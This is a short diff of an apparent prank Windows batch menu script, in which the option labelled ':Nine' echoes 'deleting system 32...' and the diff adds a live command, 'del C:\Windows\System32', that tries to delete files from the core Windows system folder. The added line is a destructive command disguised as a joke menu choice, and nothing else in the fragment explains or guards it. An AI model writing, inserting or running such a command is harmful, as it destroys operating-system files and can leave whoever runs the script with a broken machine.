@@ -61,4 +61,5 @@ echo AHHHH
 goto MENU
 :Nine
 echo deleting system 32...
+del C:\Windows\System32
 goto MENU
